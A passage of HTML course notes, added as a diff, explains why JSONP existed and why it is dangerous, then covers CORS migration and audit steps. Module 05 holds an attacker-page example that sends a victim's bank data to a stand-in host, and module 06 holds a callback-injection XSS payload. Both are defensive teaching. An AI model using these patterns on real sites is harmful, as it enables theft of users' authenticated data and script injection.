@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JSONP - why it existed, why it is dangerous</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;0,6..72,600;1,6..72,400&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  color-scheme: light;
+  --paper:#E7EBE3;
+  --card:#F6F8F3;
+  --ink:#14201A;
+  --soft:#4A5A50;
+  --rule:#C6D0C0;
+  --pen:#2A3E9B;
+  --stamp:#B33A2B;
+  --mark:#EFEA5A;
+  --display:'Space Grotesk',ui-sans-serif,system-ui,sans-serif;
+  --body:'Newsreader',Georgia,'Times New Roman',serif;
+  --mono:'IBM Plex Mono',ui-monospace,'SF Mono',Menlo,monospace;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  background:var(--paper);
+  background-image:
+    linear-gradient(var(--rule) .5px,transparent .5px),
+    linear-gradient(90deg,var(--rule) .5px,transparent .5px);
+  background-size:26px 26px;
+  color:var(--ink);
+  font-family:var(--body);
+  font-size:17.5px;
+  line-height:1.62;
+}
+.sheet{max-width:940px;margin:0 auto;padding:0 22px 120px}
+.masthead{padding:64px 0 30px;border-bottom:2px solid var(--ink)}
+.eyebrow{
+  font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;
+  text-transform:uppercase;color:var(--pen);margin:0 0 14px;
+}
+h1{
+  font-family:var(--display);font-weight:700;
+  font-size:76px;line-height:.94;
+  letter-spacing:0;margin:0 0 4px;
+}
+h1 em{font-style:normal;display:block;color:var(--stamp)}
+.thesis{
+  font-size:22px;line-height:1.45;
+  max-width:34em;margin:22px 0 0;color:var(--soft);
+}
+.thesis b{color:var(--ink);font-weight:600}
+.therule{
+  margin:34px 0 0;background:var(--ink);color:var(--card);
+  padding:26px 28px;border-radius:2px;
+}
+.therule .lbl{
+  font-family:var(--mono);font-size:10.5px;letter-spacing:.18em;
+  text-transform:uppercase;opacity:.62;display:block;margin-bottom:12px;
+}
+.therule p{margin:0;font-family:var(--mono);font-size:15px;line-height:1.7}
+.therule .hi{background:var(--mark);color:var(--ink);padding:0 4px}
+.toc{margin:44px 0 0;padding:0;list-style:none;
+  columns:2;column-gap:34px;font-family:var(--mono);font-size:13px}
+.toc li{margin:0 0 7px;break-inside:avoid}
+.toc a{color:var(--ink);text-decoration:none;border-bottom:1px solid var(--rule)}
+.toc a:hover,.toc a:focus{border-color:var(--stamp);color:var(--stamp)}
+.toc .n{color:var(--pen);margin-right:9px}
+section.mod{margin:76px 0 0;scroll-margin-top:20px}
+.modhead{display:flex;gap:16px;align-items:baseline;border-bottom:1px solid var(--ink);padding-bottom:9px}
+.modnum{font-family:var(--mono);font-size:13px;color:var(--stamp);font-weight:600;flex:none}
+h2{font-family:var(--display);font-weight:700;font-size:32px;
+   letter-spacing:0;line-height:1.1;margin:0}
+h3{font-family:var(--display);font-weight:500;font-size:19px;letter-spacing:0;
+   margin:34px 0 10px}
+p{margin:0 0 15px}
+.mod > p:first-of-type{margin-top:18px}
+.analogy{
+  margin:22px 0;padding:20px 22px 20px 26px;
+  background:var(--card);border-left:3px solid var(--pen);
+  border-radius:0 3px 3px 0;position:relative;
+}
+.analogy::before{
+  content:"THE PICTURE";position:absolute;top:-9px;left:20px;
+  background:var(--pen);color:var(--card);font-family:var(--mono);
+  font-size:9.5px;letter-spacing:.15em;padding:2px 8px;border-radius:2px;
+}
+.analogy p:last-child{margin-bottom:0}
+.analogy p:first-child{margin-top:6px}
+.spec{
+  margin:22px 0;padding:22px 24px;background:#fff;
+  border:1px solid var(--ink);border-radius:2px;position:relative;
+}
+.spec::before{
+  content:"THE MECHANISM";position:absolute;top:-9px;left:20px;
+  background:var(--ink);color:var(--card);font-family:var(--mono);
+  font-size:9.5px;letter-spacing:.15em;padding:2px 8px;border-radius:2px;
+}
+.spec > :first-child{margin-top:6px}
+.spec p:last-child,.spec ol:last-child,.spec ul:last-child{margin-bottom:0}
+.spec ol,.spec ul{margin:0 0 15px;padding-left:22px}
+.spec li{margin:0 0 8px}
+.spec ol{font-family:var(--mono);font-size:14px;line-height:1.62}
+.callout{margin:22px 0;padding:16px 20px;border-radius:2px;font-size:16.5px}
+.callout .ct{font-family:var(--display);font-weight:700;font-size:13px;
+  letter-spacing:.04em;text-transform:uppercase;display:block;margin-bottom:6px}
+.callout p:last-child{margin-bottom:0}
+.watch{background:#FDF3E7;border:1px solid #E0B27A}
+.watch .ct{color:#9A5B12}
+.brain{background:#EDF0FB;border:1px solid #B4BEE6}
+.brain .ct{color:var(--pen)}
+.crazy{background:#FBEDEB;border:1px solid #E5B0A7}
+.crazy .ct{color:var(--stamp)}
+.stamp{
+  display:inline-block;font-family:var(--mono);font-size:10px;font-weight:600;
+  letter-spacing:.12em;color:var(--stamp);border:1.5px solid var(--stamp);
+  padding:1px 6px;border-radius:2px;transform:rotate(-2deg);
+  white-space:nowrap;vertical-align:middle;
+}
+pre,code{font-family:var(--mono)}
+code{font-size:.87em;background:rgba(20,32,26,.07);padding:1px 4px;border-radius:2px}
+pre{
+  background:var(--ink);color:#E4EDE6;padding:16px 18px;border-radius:2px;
+  overflow-x:auto;font-size:13.5px;line-height:1.62;margin:16px 0;
+}
+pre code{background:none;padding:0;font-size:inherit;color:inherit}
+pre .c{color:#8FA898}
+pre .r{color:#F2938A}
+pre .g{color:#B9DFA3}
+pre .y{color:var(--mark)}
+.io{display:grid;gap:0;margin:16px 0}
+.io .lab{font-family:var(--mono);font-size:10px;letter-spacing:.15em;
+  text-transform:uppercase;color:var(--soft);padding:0 0 5px}
+.io pre{margin:0 0 14px}
+.rail{
+  display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);
+  gap:26px;margin:20px 0;align-items:start;
+}
+@media(max-width:680px){.rail{grid-template-columns:1fr}}
+.railbox{background:var(--card);border:1px solid var(--rule);border-radius:2px;padding:16px 18px}
+.railbox h4{
+  font-family:var(--mono);font-size:10px;letter-spacing:.15em;text-transform:uppercase;
+  color:var(--soft);margin:0 0 12px;font-weight:500;
+}
+.stk{list-style:none;margin:0;padding:0;font-family:var(--mono);font-size:13px}
+.stk li{
+  padding:5px 10px;border:1px solid var(--rule);border-bottom:none;background:#fff;
+  display:flex;justify-content:space-between;align-items:center;gap:10px;
+  min-width:0;overflow-wrap:anywhere;
+}
+.stk li:last-child{border-bottom:1px solid var(--rule)}
+.stk li.tgt{border-color:var(--stamp);background:#FBEDEB;color:var(--stamp);font-weight:600}
+.stk li.tpl{border-color:var(--pen);background:#EDF0FB;color:var(--pen);font-weight:600}
+.stk .note{font-size:10px;letter-spacing:.06em;text-transform:uppercase;opacity:.8}
+.tree{
+  font-family:var(--mono);font-size:13px;line-height:1.75;margin:0;
+  white-space:pre;overflow-x:auto;background:none;color:var(--ink);padding:0;
+}
+.tree .new{color:var(--stamp);font-weight:600}
+.tree .mark{background:var(--mark);padding:0 2px}
+.caret{color:var(--stamp);font-weight:600}
+.tblwrap{overflow-x:auto;margin:20px 0;border:1px solid var(--ink);border-radius:2px;background:#fff}
+table{border-collapse:collapse;width:100%;font-size:14px;min-width:640px}
+th,td{text-align:left;padding:9px 13px;border-bottom:1px solid var(--rule);vertical-align:top}
+thead th{
+  background:var(--ink);color:var(--card);font-family:var(--mono);
+  font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;font-weight:500;
+  position:sticky;top:0;
+}
+tbody tr:last-child td{border-bottom:none}
+td code{font-size:12.5px}
+.yes{color:var(--stamp);font-weight:700;font-family:var(--mono)}
+.no{color:var(--soft);font-family:var(--mono);opacity:.65}
+.strat{font-family:var(--mono);font-size:11px;letter-spacing:.06em;font-weight:600}
+details{
+  background:var(--card);border:1px solid var(--rule);border-radius:2px;
+  padding:14px 18px;margin:0 0 12px;
+}
+details[open]{border-color:var(--pen)}
+summary{
+  cursor:pointer;font-weight:500;list-style:none;display:flex;gap:12px;align-items:baseline;
+}
+summary::-webkit-details-marker{display:none}
+summary::before{
+  content:"?";font-family:var(--mono);color:var(--stamp);font-weight:600;flex:none;
+}
+details[open] summary::before{content:"!"}
+details > *:not(summary){margin-top:13px}
+details p:last-child{margin-bottom:0}
+.colophon{
+  margin:88px 0 0;padding:26px 0 0;border-top:2px solid var(--ink);
+  font-size:14.5px;color:var(--soft);
+}
+.colophon a{color:var(--pen)}
+.colophon h3{margin-top:0}
+a:focus-visible,summary:focus-visible{
+  outline:2.5px solid var(--stamp);outline-offset:3px;border-radius:2px;
+}
+@media(max-width:620px){
+  .toc{columns:1}
+  .sheet{padding-left:18px;padding-right:18px}
+  .therule{padding:22px 20px}
+  .modhead{align-items:flex-start}
+  h1{font-size:44px}
+  h2{font-size:27px}
+  .thesis{font-size:19px}
+}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+@media print{body{background:#fff}pre{background:#f2f2f2;color:#000}}
+</style>
+</head>
+<body>
+<div class="sheet">
+
+<header class="masthead">
+  <p class="eyebrow">web security course notes / JSONP</p>
+  <h1>JSONP <em>was a loophole with an API shape</em></h1>
+  <p class="thesis">JSONP was created because early web applications needed cross-origin data before CORS existed. Its trick was simple: <b>move data through the one cross-origin channel the browser already allowed to execute - a script tag.</b> That same trick is why JSONP remains dangerous: it is not data retrieval; it is remote code execution by design.</p>
+
+  <div class="therule">
+    <span class="lbl">The rule of the whole topic</span>
+    <p>JSONP works only because <span class="hi">cross-origin script inclusion is allowed</span>. The server does not send JSON to be parsed. It sends JavaScript to be executed. If the endpoint carries cookies, reflects a callback, exposes private data, or can be loaded by an attacker, the security boundary has already moved from <em>origin checks</em> to <em>trusting arbitrary script execution</em>.</p>
+  </div>
+
+  <ol class="toc">
+    <li><a href="#m00"><span class="n">00</span>The problem JSONP solved</a></li>
+    <li><a href="#m01"><span class="n">01</span>The browser primitive it abused</a></li>
+    <li><a href="#m02"><span class="n">02</span>The JSONP contract</a></li>
+    <li><a href="#m03"><span class="n">03</span>Why it was useful in 2005</a></li>
+    <li><a href="#m04"><span class="n">04</span>Why it is dangerous</a></li>
+    <li><a href="#m05"><span class="n">05</span>Attack class: data theft</a></li>
+    <li><a href="#m06"><span class="n">06</span>Attack class: callback injection</a></li>
+    <li><a href="#m07"><span class="n">07</span>Attack class: trust confusion</a></li>
+    <li><a href="#m08"><span class="n">08</span>JSON hijacking and legacy edges</a></li>
+    <li><a href="#m09"><span class="n">09</span>CORS changed the design space</a></li>
+    <li><a href="#m10"><span class="n">10</span>Defensive decisions</a></li>
+    <li><a href="#m11"><span class="n">11</span>Audit checklist</a></li>
+    <li><a href="#m12"><span class="n">12</span>Self-check</a></li>
+  </ol>
+</header>
+
+<section class="mod" id="m00">
+  <div class="modhead"><span class="modnum">00</span><h2>The problem JSONP solved</h2></div>
+
+  <p>The Web originally had a strong asymmetry. Browsers could <em>send</em> many cross-origin requests by loading images, scripts, stylesheets, forms, frames, and other embedded resources. But scripts running in a page could not freely <em>read</em> cross-origin responses through APIs such as <code>XMLHttpRequest</code>. That read restriction is the security value of the Same-Origin Policy.</p>
+
+  <div class="analogy">
+    <p>Same-Origin Policy is not "the browser cannot contact other sites." Browsers contact other sites constantly.</p>
+    <p>The better mental model is a mailroom. A page can mail a request to another building, and the browser may even bring back a box. The page is not automatically allowed to open the box and inspect its contents. JSONP worked by asking the other building to send back a performer who walks into your room and speaks the answer aloud as JavaScript.</p>
+  </div>
+
+  <div class="spec">
+    <p>Before standardized CORS deployment, a normal Ajax request from <code>https://app.example</code> to <code>https://api.partner.test</code> hit this wall:</p>
+    <ol>
+      <li>The page could create an <code>XMLHttpRequest</code>.</li>
+      <li>The browser could send the network request.</li>
+      <li>The browser would refuse to expose the response body to the calling script unless the response was same-origin or otherwise specially permitted.</li>
+    </ol>
+    <p>But the page could always do this:</p>
+<pre><code>&lt;script src=<span class="y">"https://api.partner.test/news.js"</span>&gt;&lt;/script&gt;</code></pre>
+    <p>That script would execute in the caller's page. JSONP took that old composition rule and made it look like a data API.</p>
+  </div>
+
+  <div class="callout brain">
+    <span class="ct">Defense-room phrasing</span>
+    <p>JSONP is not a relaxation of Same-Origin Policy in the same sense as CORS. It is a bypass pattern built from a resource type that Same-Origin Policy intentionally allowed to be embedded: cross-origin scripts.</p>
+  </div>
+</section>
+
+<section class="mod" id="m01">
+  <div class="modhead"><span class="modnum">01</span><h2>The browser primitive it abused</h2></div>
+
+  <p>The primitive is <strong>cross-site script inclusion</strong>. A page may include a script from another origin, and that script runs with the authority of the including page, not with an isolated data-only authority. It can call functions, read non-HttpOnly DOM state, modify the page, issue same-origin requests as the page, and exfiltrate values.</p>
+
+  <div class="rail">
+    <div class="railbox">
+      <h4>Data channel people wanted</h4>
+      <ul class="stk">
+        <li>Request remote JSON <span class="note">read</span></li>
+        <li>Parse response as data <span class="note">object</span></li>
+        <li>Handle success and failure <span class="note">control</span></li>
+        <li class="tpl">Preserve code/data boundary <span class="note">safe</span></li>
+      </ul>
+    </div>
+    <div class="railbox">
+      <h4>Channel JSONP actually used</h4>
+      <ul class="stk">
+        <li>Inject a script tag <span class="note">load</span></li>
+        <li>Execute remote response <span class="note">code</span></li>
+        <li>Hope it calls your function <span class="note">callback</span></li>
+        <li class="tgt">Give remote server script execution <span class="note">danger</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="spec">
+    <p>A browser does not parse a <code>&lt;script src&gt;</code> response as JSON. It parses it as a script resource. The classic JSONP response therefore had to be valid JavaScript:</p>
+<pre><code><span class="c">// request</span>
+GET /profile?callback=receiveProfile HTTP/1.1
+Host: api.example
+Cookie: session=...
+
+<span class="c">// response body</span>
+receiveProfile({<span class="y">"name"</span>:<span class="y">"Ada"</span>,<span class="y">"plan"</span>:<span class="y">"research"</span>});</code></pre>
+    <p>The response is executable source text. The braces do not make it safe. The callback wrapper makes it deliberately executable.</p>
+  </div>
+
+  <div class="callout watch">
+    <span class="ct">Common mistake</span>
+    <p>Saying "JSONP returns JSON" is imprecise in a way that hides the vulnerability. JSONP returns JavaScript whose argument is usually a JSON-shaped value. That distinction is the whole security story.</p>
+  </div>
+</section>
+
+<section class="mod" id="m02">
+  <div class="modhead"><span class="modnum">02</span><h2>The JSONP contract</h2></div>
+
+  <p>A JSONP endpoint and a client agree on a callback parameter, commonly <code>callback</code> or <code>jsonp</code>. The client names a global function. The server wraps the payload in a call to that function. The browser loads the endpoint through a dynamically created script element.</p>
+
+  <div class="io">
+    <span class="lab">Minimal JSONP client</span>
+<pre><code>window.handleBalance = function (data) {
+  renderBalance(data);
+};
+
+const s = document.createElement(<span class="y">"script"</span>);
+s.src = <span class="y">"https://bank.example/balance?callback=handleBalance"</span>;
+document.head.appendChild(s);</code></pre>
+    <span class="lab">Server response</span>
+<pre><code>handleBalance({<span class="y">"account"</span>:<span class="y">"checking"</span>,<span class="y">"balance"</span>:1234.56});</code></pre>
+  </div>
+
+  <div class="spec">
+    <p>The contract has four implicit assumptions:</p>
+    <ol>
+      <li>The server trusts the callback string enough to place it into JavaScript source.</li>
+      <li>The including page trusts the server enough to execute whatever it returns.</li>
+      <li>The browser attaches ambient credentials, such as cookies, according to normal resource-loading rules.</li>
+      <li>The response has no native browser-enforced notion of "this was data intended only for a particular origin."</li>
+    </ol>
+  </div>
+
+  <div class="callout crazy">
+    <span class="ct">The dangerous elegance</span>
+    <p>JSONP needed no new browser feature. It worked precisely because every moving part already existed: script loading, global functions, cookies, and JavaScript function calls.</p>
+  </div>
+</section>
+
+<section class="mod" id="m03">
+  <div class="modhead"><span class="modnum">03</span><h2>Why it was useful in 2005</h2></div>
+
+  <p>JSONP was not invented because people failed to understand security. It was invented because the web platform lacked a standardized, broadly deployed, data-only cross-origin read mechanism. Web applications were becoming richer, APIs were exposing JSON, and developers wanted mashups, widgets, search suggestions, maps, feeds, and partner integrations that ran in old browsers.</p>
+
+  <div class="tblwrap">
+    <table>
+      <thead><tr><th>Constraint</th><th>JSONP answer</th><th>Security cost</th></tr></thead>
+      <tbody>
+        <tr><td>No broadly available CORS</td><td>Use <code>&lt;script src&gt;</code>, which was already cross-origin</td><td>Response executes as code</td></tr>
+        <tr><td>No preflight or server negotiation</td><td>Plain GET request</td><td>Only fits simple retrieval semantics</td></tr>
+        <tr><td>Old browsers and widgets</td><td>Works with ancient DOM APIs</td><td>Global callback namespace and race hazards</td></tr>
+        <tr><td>Need to embed partner data</td><td>Server wraps data in caller's function name</td><td>Server reflects attacker-influenced source text</td></tr>
+        <tr><td>CDN-friendly public feeds</td><td>Cacheable script response</td><td>Private and public data often got mixed by mistake</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="analogy">
+    <p>JSONP is the web equivalent of using a fire exit as the delivery entrance because the front door was locked and the building urgently needed supplies.</p>
+    <p>That may explain the practice. It does not make the fire exit a good permanent loading dock.</p>
+  </div>
+
+  <div class="callout brain">
+    <span class="ct">Historically fair, technically strict</span>
+    <p>For public, non-sensitive, read-only feeds in older browsers, JSONP was a practical compatibility hack. The mistake was treating that hack as a safe general-purpose API pattern.</p>
+  </div>
+</section>
+
+<section class="mod" id="m04">
+  <div class="modhead"><span class="modnum">04</span><h2>Why it is dangerous</h2></div>
+
+  <p>JSONP collapses the distinction between <strong>receiving data</strong> and <strong>executing code</strong>. Once a response is loaded as a script, the browser gives it the authority of the including page. That is the root cause. Every concrete JSONP vulnerability is a variation on it.</p>
+
+  <div class="spec">
+    <h3>The security properties you lose</h3>
+    <ul>
+      <li><strong>Response confidentiality by origin:</strong> any site can include the endpoint and observe the callback execution if the response contains secrets.</li>
+      <li><strong>Data/code separation:</strong> the payload is not an inert JSON document; it is source code.</li>
+      <li><strong>Method discipline:</strong> classic JSONP is GET-only, which encourages sensitive read operations to be exposed through bookmarkable URLs.</li>
+      <li><strong>Content-type protection:</strong> even if a server says <code>application/json</code>, a script context historically made many systems think in terms of execution, sniffing, and plugin edge cases rather than data parsing.</li>
+      <li><strong>Fine-grained origin authorization:</strong> the endpoint usually cannot tell which origin inserted the script in old deployments, and script tags are not governed by CORS response exposure rules.</li>
+      <li><strong>Error handling:</strong> the caller often cannot distinguish network failure, syntax failure, malicious callback behavior, and honest empty data with the precision available to <code>fetch</code>.</li>
+    </ul>
+  </div>
+
+  <div class="callout crazy">
+    <span class="ct">The thesis sentence</span>
+    <p>JSONP is dangerous because it turns an authorization question - "may this origin read this data?" - into a code-execution question - "am I willing to run this remote origin's JavaScript inside my page?"</p>
+  </div>
+</section>
+
+<section class="mod" id="m05">
+  <div class="modhead"><span class="modnum">05</span><h2>Attack class: data theft</h2></div>
+
+  <p>The most important JSONP failure is exposing authenticated data. If a victim is logged in to <code>bank.example</code>, an attacker page can load <code>https://bank.example/jsonp/balance?callback=steal</code>. If the endpoint responds with the victim's cookie-authenticated data, the attacker receives it through the callback.</p>
+
+  <div class="io">
+    <span class="lab">Attacker page</span>
+<pre><code>function steal(data) {
+  navigator.sendBeacon(<span class="y">"https://attacker.test/collect"</span>,
+    JSON.stringify(data));
+}
+
+const s = document.createElement(<span class="y">"script"</span>);
+s.src = <span class="y">"https://bank.example/api/balance?callback=steal"</span>;
+document.head.appendChild(s);</code></pre>
+    <span class="lab">Victim-authenticated response</span>
+<pre><code>steal({
+  <span class="y">"name"</span>: <span class="y">"Victim User"</span>,
+  <span class="y">"last4"</span>: <span class="y">"1337"</span>,
+  <span class="y">"balance"</span>: <span class="y">"$42,000"</span>
+});</code></pre>
+  </div>
+
+  <div class="spec">
+    <p>This resembles CSRF in one sense: the attacker causes the victim's browser to send an authenticated cross-site request. It differs in the key security outcome: with JSONP, the attacker may also <strong>read the response</strong>, because the server voluntarily packaged the response as executable JavaScript that calls an attacker-controlled function.</p>
+  </div>
+
+  <div class="callout watch">
+    <span class="ct">Cookie nuance</span>
+    <p>Modern <code>SameSite</code> cookie defaults reduce some cross-site cookie attachment, but they do not make JSONP safe as a design. Older cookies, explicitly configured cookies, same-site-but-cross-origin subdomain cases, and non-cookie credentials can still matter. Treat <code>SameSite</code> as a mitigating layer, not as permission to keep sensitive JSONP endpoints.</p>
+  </div>
+</section>
+
+<section class="mod" id="m06">
+  <div class="modhead"><span class="modnum">06</span><h2>Attack class: callback injection</h2></div>
+
+  <p>The callback parameter is code-adjacent by construction. If the server validates it weakly, the attacker can break out of the intended function-call grammar and create reflected XSS or script gadget behavior.</p>
+
+  <div class="io">
+    <span class="lab">Vulnerable server idea</span>
+<pre><code>callback = request.query[<span class="y">"callback"</span>]
+body = callback + <span class="y">"("</span> + json + <span class="y">");"</span></code></pre>
+    <span class="lab">Malicious request</span>
+<pre><code>/feed?callback=alert(document.domain)//</code></pre>
+    <span class="lab">Generated JavaScript</span>
+<pre><code>alert(document.domain)//({<span class="y">"items"</span>:[]});</code></pre>
+  </div>
+
+  <div class="spec">
+    <p>A strict JSONP callback is not "any string before an opening parenthesis." A defensive implementation historically had to limit it to a conservative JavaScript identifier path, for example <code>foo</code> or <code>App.handlers.feed</code>, with no brackets, quotes, operators, whitespace, comments, assignment, constructor access, Unicode confusion, or percent-decoding surprises.</p>
+    <p>Even strict validation is only a patch over the deeper issue: the endpoint still returns executable code. A perfect callback allowlist can prevent callback-string XSS while doing nothing to prevent authenticated data leakage.</p>
+  </div>
+
+  <div class="callout crazy">
+    <span class="ct">Audit phrase</span>
+    <p>Callback validation is necessary if JSONP must exist, but it is not sufficient to make JSONP a safe carrier for sensitive data.</p>
+  </div>
+</section>
+
+<section class="mod" id="m07">
+  <div class="modhead"><span class="modnum">07</span><h2>Attack class: trust confusion</h2></div>
+
+  <p>JSONP creates two opposite trust problems at the same time. The consumer must trust the provider as a script supplier. The provider may accidentally trust every consumer as an authorized reader.</p>
+
+  <div class="tblwrap">
+    <table>
+      <thead><tr><th>Direction</th><th>Question</th><th>JSONP failure mode</th></tr></thead>
+      <tbody>
+        <tr><td>Consumer trusting provider</td><td>May I run this remote server's JavaScript in my origin?</td><td>A compromised or malicious provider can execute code in the consumer page.</td></tr>
+        <tr><td>Provider trusting consumer</td><td>Which origins may read this user's data?</td><td>Any origin that can create a script tag can ask for the callback.</td></tr>
+        <tr><td>Browser enforcing boundary</td><td>Is this data exposed cross-origin?</td><td>The browser sees a script load, not a data API read.</td></tr>
+        <tr><td>Security review</td><td>Is this endpoint public or private?</td><td>Teams often label it "just JSON" and miss that it is executable.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="spec">
+    <p>A JSONP endpoint used by a trusted first-party page is still globally includable unless additional application-level defenses exist. The browser does not remember that <code>app.example</code> was the intended caller.</p>
+    <p>The <code>Referer</code> header was sometimes used as an authorization signal, but it is not a clean security boundary. It can be absent due to policies and privacy tools, may be too coarse, and couples authorization to ambient request metadata rather than explicit protocol design.</p>
+  </div>
+
+  <div class="callout brain">
+    <span class="ct">The core design gap</span>
+    <p>CORS asks the data owner to name allowed origins in response headers. JSONP asks the data owner to execute whatever callback the requester names. Those are not equivalent security models.</p>
+  </div>
+</section>
+
+<section class="mod" id="m08">
+  <div class="modhead"><span class="modnum">08</span><h2>JSON hijacking and legacy edges</h2></div>
+
+  <p>JSONP sits in a family of problems where JSON-shaped data becomes executable or observable through script inclusion. Historically, some attacks targeted raw JSON arrays or JavaScript engine behavior rather than formal JSONP wrappers. These are often discussed as JSON hijacking or JavaScript hijacking.</p>
+
+  <div class="spec">
+    <p>The old lesson still matters even where the original browser behavior is gone: if a private response is directly executable as script, an attacker page may find a way to observe it, trigger it, or combine it with another browser feature. That is why secure JSON APIs should be served as JSON, with the correct media type, parsed by <code>fetch</code> or XHR under CORS rules, and not be valid standalone JavaScript intended for cross-origin script inclusion.</p>
+  </div>
+
+  <div class="callout watch">
+    <span class="ct">Legacy does not mean irrelevant</span>
+    <p>Many JSON hijacking variants depended on older browser behavior. The durable security lesson is not the exact exploit primitive; it is the rule that private API responses should not be designed to execute in an attacker-controlled page.</p>
+  </div>
+
+  <div class="analogy">
+    <p>A modern lock may no longer be vulnerable to one famous picking technique. That does not justify storing the key under the mat. JSONP is the mat.</p>
+  </div>
+</section>
+
+<section class="mod" id="m09">
+  <div class="modhead"><span class="modnum">09</span><h2>CORS changed the design space</h2></div>
+
+  <p>CORS gives the server an explicit way to decide whether a browser should expose a cross-origin response to a requesting origin. That is the missing piece JSONP tried to fake through script execution.</p>
+
+  <div class="rail">
+    <div class="railbox">
+      <h4>JSONP</h4>
+      <ul class="stk">
+        <li>Transport: <code>&lt;script&gt;</code></li>
+        <li>Response: JavaScript source</li>
+        <li>Credential handling: ambient and historically blunt</li>
+        <li>Error model: script load/syntax/callback confusion</li>
+        <li class="tgt">Security primitive: code execution</li>
+      </ul>
+    </div>
+    <div class="railbox">
+      <h4>CORS + JSON</h4>
+      <ul class="stk">
+        <li>Transport: <code>fetch</code> or XHR</li>
+        <li>Response: JSON document</li>
+        <li>Credential handling: explicit client and server choices</li>
+        <li>Error model: HTTP, network, parse, policy separation</li>
+        <li class="tpl">Security primitive: response exposure control</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="spec">
+    <p>A modern cross-origin JSON response should look conceptually like this:</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: https://app.example
+Vary: Origin
+
+{<span class="y">"items"</span>:[<span class="y">"a"</span>,<span class="y">"b"</span>]}</code></pre>
+    <p>And the client should treat it as data:</p>
+<pre><code>const res = await fetch(<span class="y">"https://api.example/items"</span>, {
+  credentials: <span class="y">"include"</span>
+});
+const data = await res.json();</code></pre>
+  </div>
+
+  <div class="callout crazy">
+    <span class="ct">The CORS warning</span>
+    <p>CORS can be misconfigured. <code>Access-Control-Allow-Origin: *</code> on public data can be fine; reflecting arbitrary origins with credentials is not. But a flawed CORS policy is still a data-exposure policy mistake. JSONP begins by discarding the data/code boundary entirely.</p>
+  </div>
+</section>
+
+<section class="mod" id="m10">
+  <div class="modhead"><span class="modnum">10</span><h2>Defensive decisions</h2></div>
+
+  <p>The right defense depends on whether you own a legacy JSONP endpoint, consume third-party JSONP, or are designing a new API. The default decision should be removal or migration.</p>
+
+  <div class="tblwrap">
+    <table>
+      <thead><tr><th>Situation</th><th>Preferred decision</th><th>If temporary compatibility is unavoidable</th></tr></thead>
+      <tbody>
+        <tr><td>New API</td><td class="yes">Do not implement JSONP</td><td>Use CORS, OAuth/token authorization, and JSON media types.</td></tr>
+        <tr><td>Public non-sensitive feed</td><td>Prefer CORS JSON anyway</td><td>Keep data strictly public, cacheable, GET-only, and documented as executable script.</td></tr>
+        <tr><td>Authenticated user data</td><td class="yes">Remove JSONP</td><td>Do not rely on callback validation; migrate clients.</td></tr>
+        <tr><td>Callback parameter exists</td><td>Validate strictly or remove</td><td>Allow only conservative identifier paths; reject everything else.</td></tr>
+        <tr><td>Legacy consumers</td><td>Version and deprecate</td><td>Add telemetry, warnings, migration docs, and a shutdown date.</td></tr>
+        <tr><td>Consuming third-party JSONP</td><td>Avoid in sensitive apps</td><td>Put it in an isolated frame/domain or server-side proxy after review.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="spec">
+    <h3>Minimum controls if you cannot remove it today</h3>
+    <ul>
+      <li>Serve no secrets, personal data, internal identifiers, CSRF tokens, or authorization-dependent content.</li>
+      <li>Require GET and make the operation read-only and side-effect free.</li>
+      <li>Use a strict callback allowlist grammar; never concatenate arbitrary callback strings.</li>
+      <li>Set <code>X-Content-Type-Options: nosniff</code> and an explicit script-oriented content type for actual JSONP, while serving real JSON only as <code>application/json</code>.</li>
+      <li>Do not mix JSON and JSONP on the same URL based only on the presence of a parameter unless the behavior is tightly tested and monitored.</li>
+      <li>Log usage by client, endpoint, callback name, and response class so you can remove it deliberately.</li>
+      <li>Do not treat <code>Origin</code> or <code>Referer</code> as a complete fix for JSONP data exposure.</li>
+    </ul>
+  </div>
+
+  <div class="callout watch">
+    <span class="ct">CSP limitation</span>
+    <p>A strong <code>script-src</code> can protect a consuming application from loading unapproved JSONP providers. It cannot protect other sites from loading your vulnerable JSONP endpoint, and it cannot make an endpoint safe to expose private data.</p>
+  </div>
+</section>
+
+<section class="mod" id="m11">
+  <div class="modhead"><span class="modnum">11</span><h2>Audit checklist</h2></div>
+
+  <p>When reviewing a codebase or external surface, search for both server-side and client-side signals. JSONP often survives as a forgotten compatibility option.</p>
+
+  <div class="rail">
+    <div class="railbox">
+      <h4>Search server code and routes</h4>
+      <ul class="stk">
+        <li><code>callback</code> <span class="note">parameter</span></li>
+        <li><code>jsonp</code> <span class="note">parameter</span></li>
+        <li><code>application/javascript</code> <span class="note">type</span></li>
+        <li><code>text/javascript</code> <span class="note">type</span></li>
+        <li><code>res.jsonp</code> <span class="note">framework</span></li>
+        <li><code>/**/</code> prefixing <span class="note">legacy</span></li>
+      </ul>
+    </div>
+    <div class="railbox">
+      <h4>Search frontend code</h4>
+      <ul class="stk">
+        <li><code>dataType: "jsonp"</code> <span class="note">jquery</span></li>
+        <li><code>jsonpCallback</code> <span class="note">jquery</span></li>
+        <li><code>createElement("script")</code> <span class="note">dynamic</span></li>
+        <li><code>?callback=</code> <span class="note">url</span></li>
+        <li><code>&lt;script src="https://api</code> <span class="note">static</span></li>
+        <li>global handler names <span class="note">callback</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="spec">
+    <h3>Questions that find the real risk</h3>
+    <ol>
+      <li>Can the endpoint return user-specific, tenant-specific, admin-only, or non-public data?</li>
